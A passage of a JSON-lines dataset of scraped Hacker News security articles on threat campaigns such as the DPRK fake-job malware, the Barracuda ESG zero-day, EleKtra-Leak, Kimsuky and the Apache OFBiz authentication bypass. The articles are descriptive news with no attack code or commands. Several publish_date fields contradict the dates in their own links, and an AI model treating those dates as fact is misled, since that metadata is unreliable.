payload used to launch BeaverTail.\nBlockNovas has been observed leveraging video assessments to distribute FROSTYFERRET and GolangGhost using ClickFix-related lures, a tactic that was detailed earlier this month by Sekoia, which is tracking the activity under the name ClickFake Interview.\nBeaverTail is configured to contact an external server (\"lianxinxiao[.]com\") for command-and-control (C2) to serve InvisibleFerret as the follow-up payload.\nIt comes with various features to harvest system information, launch a reverse shell, download additional modules to steal browser data, files, and initiate the installation of the AnyDesk remote access software.\nFurther analysis of the malicious infrastructure has revealed the presence of a \"Status Dashboard\" hosted on one of BlockNovas' subdomains to maintain visibility into four of their domains: lianxinxiao[.]com, angeloperonline[.]online, and softglide[.]co.\nA separate subdomain, mail.blocknovas[.]com domain, has also been found to be hosting an open-source, distributed password cracking management system called Hashtopolis.\nThe fake recruitment drives have led to at least one developer getting their MetaMask wallet allegedly compromised in September 2024.\nThat's not all.\nThe threat actors also appear to be hosting a tool named Kryptoneer on the domain attisscmo[.]com that offers the ability to connect to cryptocurrency wallets such as Suiet Wallet, Ethos Wallet, and Sui Wallet. \"\nIt's possible that North Korean threat actors have made additional efforts to target the Sui blockchain, or this domain may be used within job application processes as an example of the 'crypto project' being worked on,\" Silent Push said.\nBlockNovas, according to an independent report published by Trend Micro, also advertised in December 2024 an open position for a senior software engineer on LinkedIn, specifically targeting Ukrainian IT professionals.\nAs of April 23, 2025, the BlockNovas domain has been seized by the U.S. Federal Bureau of Investigation (FBI) as part of a law enforcement action against North Korean cyber actors for using it to \"deceive individuals with fake job postings and distribute malware.\"\nBesides using services like Astrill VPN and residential proxies to obfuscate their infrastructure and activities, a noteworthy aspect of the malicious activity is the use of artificial intelligence (AI)-powered tools like Remaker to create profile pictures.\nThe cybersecurity company, in its analysis of the Contagious Interview campaign, said it identified five Russian IP ranges that have been used to carry out the operation.\nThese IP addresses are obscured by a VPN layer, a proxy layer, or an RDP layer. \"\nThe Russian IP address ranges, which are concealed by a large anonymization network that uses commercial VPN services, proxy servers, and numerous VPS servers with RDP, are assigned to two companies in Khasan and Khabarovsk,\" security researchers Feike Hacquebord and Stephen Hilt said. \"\nKhasan is a mile from the North Korea-Russia border, and Khabarovsk is known for its economic and cultural ties with North Korea.\"\nIf Contagious Interview is one side of the coin, the other is the fraudulent IT worker threat known as Wagemole, which refers to a tactic that involves crafting fake personas using AI to get their IT workers hired remotely as employees at major companies.\nThese efforts have dual motivations, designed to steal sensitive data and pursue financial gain by funneling a chunk of the monthly salaries back to the Democratic People's Republic of Korea (DPRK). \"\nFacilitators are now using GenAI-based tools to optimize every step in the process of applying and interviewing for roles and to aid DPRK nationals attempting to maintain this employment,\" Okta said. \"\nThese GenAI-enhanced services are required to manage the scheduling of job interviews with multiple DPRK candidate personas by a small cadre of facilitators.\nThese services use GenAI in everything from tools that transcribe or summarize conversations, to real-time translation of voice and text.\"\nTelemetry data gathered by Trend Micro points to the Pyongyang-aligned threat actors working from China, Russia, and Pakistan, while using the Russian IP ranges to connect to dozens of VPS servers over RDP and then perform tasks like interacting on job recruitment sites and accessing cryptocurrency-related services. \"\nGiven that a significant portion of the deeper layers of the North Korean actors' anonymization network is in Russia, it is plausible, with low to medium confidence, that some form of intentional cooperation or infrastructure sharing exists between North Korea and Russian entities,\" the company said.","num_sentences":34,"metadata":{"source":"blog","platform":"thehackernews","filename":"Contagious Interview"}}
{"id":149,"title":"Chinese Hackers Exploited New Zero-Day in Barracuda's ESG Appliances","publish_date":"2022-10-28","link":"https://thehackernews.com/2023/12/chinese-hackers-exploited-new-zero-day.html","clean_text":"Barracuda has revealed that Chinese threat actors exploited a new zero-day in its Email Security Gateway (ESG) appliances to deploy backdoors on a \"limited number\" of devices.\nTracked as CVE-2023-7102, the issue relates to a case of arbitrary code execution that resides within a third-party and open-source library named Spreadsheet::ParseExcel that's used by the Amavis scanner within the gateway to screen Microsoft Excel email attachments for malware.\nThe company attributed the activity to a threat actor tracked by Google-owned Mandiant as UNC4841, which was previously linked to the active exploitation of another zero-day in Barracuda devices (CVE-2023-2868, CVSS score: 9.8) earlier this year.\nSuccessful exploitation of the new flaw is accomplished by means of a specially crafted Microsoft Excel email attachment.\nThis is followed by the deployment of new variants of known implants called SEASPY and SALTWATER that are equipped to offer persistence and command execution capabilities. “\nOnce a target receives an email with the malicious Excel attachment from UNC4841, the email is scanned by the Barracuda ESG appliance, thereby executing the malicious code contained in the Excel file,” Austin Larsen, Mandiant senior incident response consultant, said in a statement shared with The Hacker News. “\nThis requires no interaction from an end-user, making it highly impactful and effective.”\nBarracuda said it released a security update that has been \"automatically applied\" on December 21, 2023, and that no further customer action is required.\nIt further pointed out that it \"deployed a patch to remediate compromised ESG appliances which exhibited indicators of compromise related to the newly identified malware variants\" a day later.\nIt did not disclose the scale of the compromise.\nThat said, the original flaw in the Spreadsheet::ParseExcel Perl module (version 0.65) remains unpatched and has been assigned the CVE identifier CVE-2023-7101, necessitating that downstream users take appropriate remedial action.\nAccording to Mandiant, which has been investigating the campaign, a number of private and public sector organizations located in at least 16 countries are estimated to have been impacted since October 2022.\nGoogle Cloud said it observed the exploitation of CVE-2023-7102 targeting high-tech, information technology providers, and government entities, chiefly located in the U.S. and Asia-Pacific regions, no earlier than November 30, 2023.\nThe latest development once again speaks to UNC4841's adaptability, leveraging new tactics and techniques to retain access to high priority targets as existing loopholes get closed. “\nThis latest campaign further demonstrates this actor’s persistence from the last UNC4841 campaign,” Larsen said. “\nMandiant anticipates this threat actor may broaden their targeted attack surface to other appliances with a greater variety of exploits in the future.” (\nThe story was updated after publication to include additional commentary from Google Cloud and Mandiant on the campaign.)","num_sentences":17,"metadata":{"source":"blog","platform":"thehackernews","filename":"ESG"}}
{"id":150,"title":"EleKtra-Leak Cryptojacking Attacks Exploit AWS IAM Credentials Exposed on GitHub","publish_date":"2020-12-28","link":"https://thehackernews.com/2023/10/elektra-leak-cryptojacking-attacks.html","clean_text":"A new ongoing campaign dubbed EleKtra-Leak has set its eyes on exposed Amazon Web Service (AWS) identity and access management (IAM) credentials within public GitHub repositories to facilitate cryptojacking activities. \"\nAs a result of this, the threat actor associated with the campaign was able to create multiple AWS Elastic Compute (EC2) instances that they used for wide-ranging and long-lasting cryptojacking operations,\" Palo Alto Networks Unit 42 researchers William Gamazo and Nathaniel Quist said in a technical report shared with The Hacker News.\nThe operation, active since at least December 2020, is designed to mine Monero from as many as 474 unique Amazon EC2 instances between August 30 and October 6, 2023.\nA standout aspect of the attacks is the automated targeting of AWS IAM credentials within four minutes of their initial exposure on GitHub, indicating that threat actors are programmatically cloning and scanning the repositories to capture the exposed keys.\nThe adversary has also been observed blocklisting AWS accounts that publicize IAM credentials in what's likely seen as an effort to prevent further analysis.\nThere is evidence to suggest that the attacker may also have been linked to another cryptojacking campaign disclosed by Intezer in January 2021 aimed at poorly secured Docker services using the same bespoke mining software.\nPart of the campaign's success lies in the exploitation of blindspots in GitHub's secret scanning feature and AWS' AWSCompromisedKeyQuarantine policy – which are used for flagging and preventing the misuse of compromised or exposed IAM credentials – in order to run or start EC2 instances.\nWhile the quarantine policy is applied within two minutes of the AWS credentials being publicly accessible on GitHub, it's being suspected that the keys are being exposed through an as-yet-undetermined method.\nUnit 42 said that the \"threat actor might be able to find exposed AWS keys that aren't automatically detected by AWS and subsequently control these keys outside of the AWSCompromisedKeyQuarantine policy.\"\nIn the attack chains discovered by the cybersecurity company, the stolen AWS credentials are used to perform an account reconnaissance operation, followed by creating AWS security groups and launching multiple EC2 instances across various regions from behind a virtual private network (VPN).\nThe cryptomining operations are conducted on c5a.24xlarge AWS instances owing to their higher processing power, allowing its operators to mine more cryptocurrency in a shorter period of time.\nThe mining software used to carry out cryptojacking is fetched from a Google Drive URL, highlighting a pattern of malicious actors leveraging the trust associated with widely used applications to fly under the radar. \"\nThe type of Amazon Machine Images (AMI) the threat actor used was also distinctive,\" the researchers said. \"\nThe identified images were private and they were not listed in the AWS Marketplace.\"\nTo mitigate such attacks, organizations that accidentally expose AWS IAM credentials are recommended to immediately revoke any API connections using the keys, remove them from the GitHub repository, and audit GitHub repository cloning events for any suspicious operations. \"\nThe threat actor can detect and launch a full-scale mining operation within five minutes from the time of an AWS IAM credential being exposed in a public GitHub repository,\" the researchers said. \"\nDespite successful AWS quarantine policies, the campaign maintains continuous fluctuation in the number and frequency of compromised victim accounts.\"","num_sentences":17,"metadata":{"source":"blog","platform":"thehackernews","filename":"EleKtra-Leak"}}
{"id":151,"title":"Microsoft Warns of New 'FalseFont' Backdoor Targeting the Defense Sector","publish_date":"2023-11-28","link":"https://thehackernews.com/2023/12/microsoft-warns-of-new-falsefont.html","clean_text":"Organizations in the Defense Industrial Base (DIB) sector are in the crosshairs of an Iranian threat actor as part of a campaign designed to deliver a never-before-seen backdoor called FalseFont.\nThe findings come from Microsoft, which is tracking the activity under its weather-themed moniker Peach Sandstorm (formerly Holmium), which is also known as APT33, Elfin, and Refined Kitten. \"\nFalseFont is a custom backdoor with a wide range of functionalities that allow operators to remotely access an infected system, launch additional files, and send information to its [command-and-control] servers,\" the Microsoft Threat Intelligence team said on X (previously Twitter).\nThe first recorded use of the implant was in early November 2023.\nThe tech giant further said that the latest development aligns with previous activity from Peach Sandstorm and demonstrates a continued evolution of the threat actor's tradecraft.\nIn a report published in September 2023, Microsoft linked the group to password spray attacks carried out against thousands of organizations globally between February and July 2023.\nThe intrusions primarily singled out satellite, defense, and pharmaceutical sectors.\nThe end goal, the company said, is to facilitate intelligence collection in support of Iranian state interests.\nPeach Sandstorm is believed to have been active since at least 2013.\nGoogle-owned Mandiant, in its own assessment of APT33 published in 2017, described the adversary as having \"shown particular interest\" in organizations in the aviation sector involved in both military and commercial capacities, as well as organizations in the energy sector with ties to petrochemical production.\nThe disclosure comes as the Israel National Cyber Directorate (INCD) accused Iran and Hezbollah of attempting to unsuccessfully target Ziv Hospital through hacking crews named Agrius and Lebanese Cedar.\nThe agency also revealed details of a phishing campaign in which a fake advisory for a security flaw in F5 BIG-IP products is employed as a decoy to deliver wiper malware on Windows and Linux systems.\nThe lure for the targeted attack is a critical authentication bypass vulnerability (CVE-2023-46747, CVSS score: 9.8) that came to light in late October 2023.\nThe scale of the campaign is currently unknown.\nIntezer and Broadcom-owned Symantec, which are tracking the campaign under the name Operation HamsaUpdate, described the Windows and Linux wipers as variants of Hatef and Hamsa, respectively. “\nDuring the wipe operation the malware continuously communicates with attackers via Telegram, providing updates on the status of the infected machines as well as progress of the running wiping tasks,” the cybersecurity company said.","num_sentences":16,"metadata":{"source":"blog","platform":"thehackernews","filename":"FalseFont"}}
{"id":152,"title":"New JinxLoader Targeting Users with Formbook and XLoader Malware","publish_date":"2023-11-28","link":"https://thehackernews.com/2024/01/new-jinxloader-targeting-users-with.html","clean_text":"A new Go-based malware loader called JinxLoader is being used by threat actors to deliver next-stage payloads such as Formbook and its successor XLoader.\nThe disclosure comes from cybersecurity firms Palo Alto Networks Unit 42 and Symantec, both of which highlighted multi-step attack sequences that led to the deployment of JinxLoader through phishing attacks. \"\nThe malware pays homage to League of Legends character Jinx, featuring the character on its ad poster and [command-and-control] login panel,\" Symantec said. \"\nJinxLoader's primary function is straightforward – loading malware.\"\nUnit 42 revealed in late November 2023 that the malware service was first advertised on hackforums[.]net on April 30, 2023, for $60 a month, $120 a year, or for a lifetime fee of $200.\nThe attacks begin with phishing emails impersonating Abu Dhabi National Oil Company (ADNOC), urging recipients to open password-protected RAR archive attachments that, upon opening, drop the JinxLoader executable, which subsequently acts as a gateway for Formbook or XLoader.\nThe development comes as ESET revealed a spike in infections, delivering another novice loader malware family dubbed Rugmi to propagate a wide range of information stealers.\nIt also comes amid a surge in campaigns distributing DarkGate and PikaBot, along with a threat actor known as TA544 (aka Narwal Spider) leveraging new variants of loader malware called IDAT Loader to deploy Remcos RAT or SystemBC malware.\nWhat's more, the threat actors behind the Meduza Stealer have released an updated version of the malware (version 2.2) on the dark web with expanded support for browser-based cryptocurrency wallets and an improved credit card (CC) grabber.\nIn a sign that stealer malware continues to be a lucrative market for cybercriminals, researchers have also discovered a new stealer family known as Vortex Stealer that's capable of exfiltrating browser data, Discord tokens, Telegram sessions, system information, and files that are less than 2 MB in size. \"\nStolen information will be archived and uploaded to Gofile or Anonfiles; the malware will also post it onto the author's Discord using webhooks,\" Symantec said. \"\nIt's also capable of posting to Telegram via a Telegram bot.\"","num_sentences":12,"metadata":{"source":"blog","platform":"thehackernews","filename":"JinxLoader"}}
{"id":153,"title":"Kimsuky Hackers Deploying AppleSeed, Meterpreter, and TinyNuke in Latest Attacks","publish_date":"2019-05-28","link":"https://thehackernews.com/2023/12/kimsuky-hackers-deploying-appleseed.html","clean_text":"Nation-state actors affiliated to North Korea have been observed using spear-phishing attacks to deliver an assortment of backdoors and tools such as AppleSeed, Meterpreter, and TinyNuke to seize control of compromised machines.\nSouth Korea-based cybersecurity company AhnLab attributed the activity to an advanced persistent threat group known as Kimsuky. \"\nA notable point about attacks that use AppleSeed is that similar methods of attack have been used for many years with no significant changes to the malware that are used together,\" the AhnLab Security Emergency Response Center (ASEC) said in an analysis published Thursday.\nKimsuky, active for over a decade, is known for its targeting of a wide range of entities in South Korea, before expanding its focus to include other geographies in 2017.\nIt was sanctioned by the U.S. government late last month for amassing intelligence to support North Korea's strategic objectives.\nThe threat actor's espionage campaigns are realized through spear-phishing attacks containing malicious lure documents that, upon opening, culminate in the deployment of various malware families.\nOne such prominent Windows-based backdoor used by Kimsuky is AppleSeed (aka JamBog), a DLL malware which has been put to use as early as May 2019 and has been updated with an Android version as well as a new variant written in Golang called AlphaSeed.\nAppleSeed is designed to receive instructions from an actor-controlled server, drop additional payloads, and exfiltrate sensitive data such as files, keystrokes, and screenshots.\nAlphaSeed, like AppleSeed, incorporates similar features but has some crucial differences as well. \"\nAlphaSeed was developed in Golang and uses chromedp for communications with the [command-and-control] server,\" ASEC said, in contrast to AppleSeed, which relies on HTTP or SMTP protocols.\nChromedp is a popular Golang library for interacting with the Google Chrome browser in headless mode through the DevTools Protocol.\nThere is evidence to suggest the Kimsuky has used AlphaSeed in attacks since October 2022, with some intrusions delivering both AppleSeed and AlphaSeed on the same target system by means of a JavaScript dropper.\nAlso deployed by the adversary are Meterpreter and VNC malware such as TightVNC and TinyNuke (aka Nuclear Bot), which can be leveraged to take control of the affected system.\nThe development comes as Nisos said it discovered a number of online personas on LinkedIn and GitHub likely used by North Korea's information technology (IT) workers to fraudulently obtain remote employment from companies in the U.S. and act as a revenue-generating stream for the regime and help fund its economic and security priorities. \"\nThe personas often claimed to be proficient in developing several different types of applications and have experience working with crypto and blockchain transactions,\" the threat intelligence firm said in a report released earlier this month. \"\nFurther, all of the personas sought remote-only positions in the technology sector and were singularly focused on obtaining new employment.\nMany of the accounts are only active for a short period of time before they are disabled.\"\nNorth Korean actors, in recent years, have launched a series of multi-pronged assaults, blending novel tactics and supply chain weaknesses to target blockchain and cryptocurrency firms to facilitate the theft of intellectual property and virtual assets.\nThe prolific and aggressive nature of the attacks points to the different ways the country has resorted in order to evade international sanctions and illegally profit from the schemes. \"\nPeople tend to think, … how could the quote-unquote 'Hermit Kingdom' possibly be a serious player from a cyber perspective?,\"\nCrowdStrike's Adam Meyers was quoted as saying to Politico. \"\nBut the reality couldn't be further from the truth.\"","num_sentences":22,"metadata":{"source":"blog","platform":"thehackernews","filename":"Kimsuky"}}
{"id":154,"title":"Critical Zero-Day in Apache OfBiz ERP System Exposes Businesses to Attack","publish_date":null,"link":"https://thehackernews.com/2023/12/critical-zero-day-in-apache-ofbiz-erp.html","clean_text":"A new zero-day security flaw has been discovered in Apache OfBiz, an open-source Enterprise Resource Planning (ERP) system that could be exploited to bypass authentication protections.\nThe vulnerability, tracked as CVE-2023-51467, resides in the login functionality and is the result of an incomplete patch for another critical vulnerability (CVE-2023-49070, CVSS score: 9.8) that was released earlier this month. \"\nThe security measures taken to patch CVE-2023-49070 left the root issue intact and therefore the authentication bypass was still present,\" the SonicWall Capture Labs threat research team, which discovered the bug, said in a statement shared with The Hacker News.\nCVE-2023-49070 refers to a pre-authenticated remote code execution flaw impacting versions prior to 18.12.10 that, when successfully exploited, could allow threat actors to gain full control over the server and siphon sensitive data.\nIt is caused due to a deprecated XML-RPC component within Apache OFBiz.\nAccording to SonicWall, CVE-2023-51467 could be triggered using empty and invalid USERNAME and PASSWORD parameters in an HTTP request to return an authentication success message, effectively circumventing the protection and enabling a threat actor to access otherwise unauthorized internal resources.\nThe attack hinges on the fact that the parameter \"requirePasswordChange\" is set to \"Y\" (i.e., yes) in the URL, causing the authentication to be trivially bypassed regardless of the values passed in the username and password fields. \"\nThe vulnerability allows attackers to bypass authentication to achieve a simple Server-Side Request Forgery (SSRF),\" according to a description of the flaw on the NIST National Vulnerability Database (NVD).\nUsers who rely on Apache OFbiz to update to version 18.12.11 or later as soon as possible to mitigate any potential threats.\nUpdate The Shadowserver Foundation said it has observed “quite a few” exploit attempts targeting CVE-2023-49070, making it imperative that users move quickly to secure their Apache OFBiz instances against the two vulnerabilities.\nSonicWall has also disclosed that it’s “seeing a large number of exploitation attempts of CVE-2023-51467,” surging from 235 attempts on December 27, 2023, to 26,928 attempts on December 29, 2023, and 3,129 attempts on January 1, 2024.","num_sentences":11,"metadata":{"source":"blog","platform":"thehackernews","filename":"OfBiz"}}
{"id":155,"title":"New Rugmi Malware Loader Surges with Hundreds of Daily Detections","publish_date":"2023-11-28","link":"https://thehackernews.com/2023/12/new-rugmi-malware-loader-surges-with.html","clean_text":"A new malware loader is being used by threat actors to deliver a wide range of information stealers such as Lumma Stealer (aka LummaC2), Vidar, RecordBreaker (aka Raccoon Stealer V2), and Rescoms.\nCybersecurity firm ESET is tracking the trojan under the name Win/TrojanDownloader.\nRugmi. \"\nThis malware is a loader with three types of components: a downloader that downloads an encrypted payload, a loader that runs the payload from internal resources, and another loader that runs the payload from an external file on the disk,\" the company said in its Threat Report H2 2023.\nTelemetry data gathered by the company shows that detections for the Rugmi loader spiked in October and November 2023, surging from single digit daily numbers to hundreds per day.\nStealer malware is typically sold under a malware-as-a-service (MaaS) model to other threat actors on a subscription basis.\nLumma Stealer, for instance, is advertised in underground forums for $250 a month.\nThe most expensive plan costs $20,000, but it also gives the customers access to the source code and the right to sell it.\nThere is evidence to suggest that the codebase associated with Mars, Arkei, and Vidar stealers has been repurposed to create Lumma.\nBesides continuously adapting its tactics to evade detection, the off-the-shelf tool is distributed through a variety of methods ranging from malvertising to fake browser updates to cracked installations of popular software such as VLC media player and OpenAI ChatGPT.\nAnother technique concerns the use of Discord's content delivery network (CDN) to host and propagate the malware, as revealed by Trend Micro in October 2023.\nThis entails leveraging a combination of random and compromised Discord accounts to send direct messages to prospective targets, offering them $10 or a Discord Nitro subscription in exchange for their assistance on a project.\nUsers who agree to the offer are then urged to download an executable file hosted on Discord CDN that masquerades as iMagic Inventory but, in reality, contains the Lumma Stealer payload. \"\nReady-made malware solutions contribute to the proliferation of malicious campaigns because they make the malware available even to potentially less technically skilled threat actors,\" ESET said. \"\nOffering a broader range of functions then serves to render Lumma Stealer even more attractive as a product.\"\nThe disclosures come as McAfee Labs disclosed a new variant of NetSupport RAT, which emerged from its legitimate progenitor NetSupport Manager and has since been put to use by initial access brokers to gather information and perform additional actions on victims of interest. \"\nThe infection begins with obfuscated JavaScript files, serving as the initial point of entry for the malware,\" McAfee said, adding it highlights the \"evolving tactics employed by cybercriminals.\"\nThe execution of the JavaScript file advances the attack chain by running PowerShell commands to retrieve the remote control and stealer malware from an actor-controlled server.\nThe campaign's primary targets include the U.S. and Canada.","num_sentences":19,"metadata":{"source":"blog","platform":"thehackernews","filename":"Rugmi"}}
{"id":156,"title":"Sea Turtle Cyber Espionage Campaign Targets Dutch IT and Telecom Companies","publish_date":"2019-04-28","link":"https://thehackernews.com/2024/01/sea-turtle-cyber-espionage-campaign.html","clean_text":"Telecommunication, media, internet service providers (ISPs), information technology (IT)-service providers, and Kurdish websites in the Netherlands have been targeted as part of a new cyber espionage campaign undertaken by a Türkiye-nexus threat actor known as Sea Turtle. \"\nThe infrastructure of the targets was susceptible to supply chain and island-hopping attacks, which the attack group used to collect politically motivated information such as personal information on minority groups and potential political dissents,\" Dutch security firm Hunt & Hackett said in a Friday analysis. \"\nThe stolen information is likely to be exploited for surveillance or intelligence gathering on specific groups and or individuals.\"\nSea Turtle, also known by the names Cosmic Wolf, Marbled Dust (formerly Silicon), Teal Kurma, and UNC1326, was first documented by Cisco Talos in April 2019, detailing state-sponsored attacks targeting public and private entities in the Middle East and North Africa.\nActivities associated with the group are believed to have been ongoing since January 2017, primarily leveraging DNS hijacking to redirect prospective targets attempting to query a specific domain to an actor-controlled server capable of harvesting their credentials. \"\nThe Sea Turtle campaign almost certainly poses a more severe threat than DNSpionage given the actor's methodology in targeting various DNS registrars and registries,\" Talos said at the time.\nIn late 2021, Microsoft noted that the adversary carries out intelligence collection to meet strategic Turkish interests from countries like Armenia, Cyprus, Greece, Iraq, and Syria, striking telecom and IT companies with an aim to \"establish a foothold upstream of their desired target\" via exploitation of known vulnerabilities.\nThen last month, the adversary was revealed to be using a simple reverse TCP shell for Linux (and Unix) systems called SnappyTCP in attacks carried out between 2021 and 2023, according to the PricewaterhouseCoopers (PwC) Threat Intelligence team. \"\nThe web shell is a simple reverse TCP shell for Linux/Unix that has basic [command-and-control] capabilities, and is also likely used for establishing persistence,\" the company said. \"\nThere are at least two main variants; one which uses OpenSSL to create a secure connection over TLS, while the other omits this capability and sends requests in cleartext.\"\nThe latest findings from Hunt & Hackett show that Sea Turtle continues to be a stealthy espionage-focused group, performing defense evasion techniques to fly under the radar and harvest email archives.\nIn one of the attacks observed in 2023, a compromised-but-legitimate cPanel account was used as an initial access vector to deploy SnappyTCP on the system.\nIt's currently not known how the attackers obtained the credentials. \"\nUsing SnappyTCP, the threat actor sent commands to the system to create a copy of an email archive created with the tool tar, in the public web directory of the website that was accessible from the internet,\" the firm noted. \"\nIt is highly likely that the threat actor exfiltrated the email archive by downloading the file directly from the web directory.\"\nTo mitigate the risks posed by such attacks, it's advised that organizations enforce strong password policies, implement two-factor authentication (2FA), rate limit login attempts to reduce the chances of brute-force attempts, monitor SSH traffic, and keep all systems and software up-to-date.","num_sentences":16,"metadata":{"source":"blog","platform":"thehackernews","filename":"Sea-Turtle"}}
{"id":157,"title":"Silent Skimmer: A Year-Long Web Skimming Campaign Targeting Online Payment Businesses","publish_date":null,"link":"https://thehackernews.com/2023/10/silent-skimmer-year-long-web-skimming.html","clean_text":"A financially motivated campaign has been targeting online payment businesses in the Asia Pacific, North America, and Latin America with web skimmers for more than a year.\nThe BlackBerry Research and Intelligence Team is tracking the activity under the name Silent Skimmer, attributing it to an actor who is knowledgeable in the Chinese language.\nProminent victims include online businesses and point-of-sale (PoS) service providers. \"\nThe campaign operators exploit vulnerabilities in web applications, particularly those hosted on Internet Information Services (IIS),\" the Canadian cybersecurity firm said. \"\nTheir primary objective is to compromise the payment checkout page, and swipe visitors' sensitive payment data.\"\nA successful initial foothold is followed by the threat actors leveraging multiple open-source tools and living-off-the-land (LotL) techniques for privilege escalation, post-exploitation, and code execution.\nThe attack chain leads to the deployment of a PowerShell-based remote access trojan (server.ps1) that allows for remotely controlling the host, which, in turn, connects to a remote server that hosts additional utilities, including downloading scripts, reverse proxies and Cobalt Strike beacons.\nThe end goal of the intrusion, per BlackBerry, is to infiltrate the web server and drop a scraper in the payment checkout service by means of a web shell and stealthily capture the financial information entered by victims on the page.\nAn examination of the adversary's infrastructure reveals that the virtual private servers (VPS) used for command-and-control (C2) are chosen based on the geolocation of the victims in an effort to evade detection.\nThe diversity of industries and regions targeted, coupled with the kind of servers breached, points to an opportunistic campaign rather than a deliberate approach. \"\nThe attacker focuses predominantly on regional websites that collect payment data, taking advantage of vulnerabilities in commonly used technologies to gain unauthorized access and retrieve sensitive payment information entered into or stored on the site,\" BlackBerry said.\nThe disclosure comes as Sophos disclosed details of a pig butchering scam in which potential targets are lured into investing in bogus cryptocurrency investment schemes after being approached on dating apps like MeetMe, netting the actors millions in illicit profits.\nWhat sets the latest operation apart is the use of liquidity mining lures, promising users regular income at high rates of return for investment in a liquidity pool, where the virtual assets are parked to facilitate trades on decentralized exchanges. \"\nThese scams require no malware on the target's device, and no 'hacking' of any sort other than fraudulent websites and social engineering — convincing targets to connect their wallet to an Ethereum smart contract that gives the scammers permission to empty the wallet,\" security researcher Sean Gallagher said.","num_sentences":14,"metadata":{"source":"blog","platform":"thehackernews","filename":"Silent Skimmer"}}
{"id":158,"title":"SpectralBlur: New macOS Backdoor Threat from North Korean Hackers","publish_date":"2023-08-28","link":"https://thehackernews.com/2024/01/spectralblur-new-macos-backdoor-threat.html","clean_text":"Cybersecurity researchers have discovered a new Apple macOS backdoor called SpectralBlur that overlaps with a known malware family that has been attributed to North Korean threat actors. \"\nSpectralBlur is a moderately capable backdoor that can upload/download files, run a shell, update its configuration, delete files, hibernate, or sleep, based on commands issued from the [command-and-control server],\" security researcher Greg Lesnewich said.\nThe malware shares similarities with KANDYKORN (aka SockRacket), an advanced implant that functions as a remote access trojan capable of taking control of a compromised host.\nIt's worth noting that the KANDYKORN activity also intersects with another campaign orchestrated by the Lazarus sub-group known as BlueNoroff (aka TA444) which culminates in the deployment of a backdoor referred to as RustBucket and a late-stage payload dubbed ObjCShellz.\nIn recent months, the threat actor has been observed combining disparate pieces of these two infection chains, leveraging RustBucket droppers to deliver KANDYKORN.\nThe latest findings are another sign that North Korean threat actors are increasingly setting their sights on macOS to infiltrate high-value targets, particularly those within the cryptocurrency and the blockchain industries. \"\nTA444 keeps running fast and furious with these new macOS malware families,\" Lesnewich said.\nSecurity researcher Patrick Wardle, who shared additional insights into the inner workings of SpectralBlur, said the Mach-O binary was uploaded to the VirusTotal malware scanning service in August 2023 from Colombia.\nThe functional similarities between KANDYKORN and SpectralBlur have raised the possibility that they may have been built by different developers keeping the same requirements in mind.\nWhat makes the malware stand out are its attempts to hinder analysis and evade detection while using grantpt to set up a pseudo-terminal and execute shell commands received from the C2 server.\nThe disclosure comes as a total of 21 new malware families designed to target macOS systems, including ransomware, information stealers, remote access trojans, and nation-state-backed malware, were discovered in 2023, up from 13 identified in 2022. \"\nWith the continued growth and popularity of macOS (especially in the enterprise!),\n2024 will surely bring a bevy of new macOS malware,\" Wardle noted.","num_sentences":13,"metadata":{"source":"blog","platform":"thehackernews","filename":"SpectralBlur"}}
{"id":159,"title":"UAC-0050 Group Using New Phishing Tactics to Distribute Remcos RAT","publish_date":"2023-02-28","link":"https://thehackernews.com/2024/01/uac-0050-group-using-new-phishing.html","clean_text":"The threat actor known as UAC-0050 is leveraging phishing attacks to distribute Remcos RAT using new strategies to evade detection from security software. \"\nThe group's weapon of choice is Remcos RAT, a notorious malware for remote surveillance and control, which has been at the forefront of its espionage arsenal,\" Uptycs security researchers Karthickkumar Kathiresan and Shilpesh Trivedi said in a Wednesday report. \"\nHowever, in their latest operational twist, the UAC-0050 group has integrated a pipe method for interprocess communication, showcasing their advanced adaptability.\"\nUAC-0050, active since 2020, has a history of targeting Ukrainian and Polish entities via social engineering campaigns that impersonate legitimate organizations to trick recipients into opening malicious attachments.\nIn February 2023, the Computer Emergency Response Team of Ukraine (CERT-UA) attributed the adversary to a phishing campaign designed to deliver Remcos RAT.\nOver the past few months, the same trojan has been distributed as part of at least three different phishing waves, with one such attack also leading to the deployment of an information stealer called Meduza Stealer.\nThe analysis from Uptycs is based on a LNK file it discovered on December 21, 2023.\nWhile the exact initial access vector is currently unknown, it's suspected to have involved phishing emails targeting Ukrainian military personnel that claim to advertise consultancy roles with the Israel Defense Forces (IDF).\nThe LNK file in question collects information regarding antivirus products installed on the target computer, and then proceeds to retrieve and execute an HTML application named \"6.hta\" from a remote server using mshta.exe, a Windows-native binary for running HTA files.\nThis step paves the way for a PowerShell script that unpacks another PowerShell script to download two files called \"word_update.exe\" and \"ofer.docx\" from the domain new-tech-savvy[.]com.\nRunning word_update.exe causes it to create a copy of itself with the name fmTask_dbg.exe and establish persistence by creating a shortcut to the new executable in the Windows Startup folder.\nThe binary also employs unnamed pipes to facilitate the exchange of data between itself and a newly spawned child process for cmd.exe in order to ultimately decrypt and launch the Remcos RAT (version 4.9.2 Pro), which is capable of harvesting system data and cookies and login information from web browsers like Internet Explorer, Mozilla Firefox, and Google Chrome. \"\nLeveraging pipes within the Windows operating system provides a covert channel for data transfer, skillfully evading detection by Endpoint Detection and Response (EDR) and antivirus systems,\" the researchers said. \"\nAlthough not entirely new, this technique marks a significant leap in the sophistication of the group's strategies.\"","num_sentences":14,"metadata":{"source":"blog","platform":"thehackernews","filename":"UAC-0050"}}
{"id":160,"title":"UAC-0099 Using WinRAR Exploit to Target Ukrainian Firms with LONEPAGE Malware","publish_date":"2023-06-28","link":"https://thehackernews.com/2023/12/uac-0099-using-winrar-exploit-to-target.html","clean_text":"The threat actor known as UAC-0099 has been linked to continued attacks aimed at Ukraine, some of which leverage a high-severity flaw in the WinRAR software to deliver a malware strain called LONEPAGE. \"\nThe threat actor targets Ukrainian employees working for companies outside of Ukraine,\" cybersecurity firm Deep Instinct said in a Thursday analysis.\nUAC-0099 was first documented by the Computer Emergency Response Team of Ukraine (CERT-UA) in June 2023, detailing its attacks against state organizations and media entities for espionage motives.\nThe attack chains leveraged phishing messages containing HTA, RAR, and LNK file attachments that led to the deployment of LONEPAGE, a Visual Basic Script (VBS) malware that's capable of contacting a command-and-control (C2) server to retrieve additional payloads such as keyloggers, stealers, and screenshot malware. \"\nDuring 2022-2023, the mentioned group received unauthorized remote access to several dozen computers in Ukraine,\" CERT-UA said at the time.\nThe latest analysis from Deep Instinct reveals that the use of HTA attachments is just one of three different infection chains, the other two of which leverage self-extracting (SFX) archives and booby-trapped ZIP files.\nThe 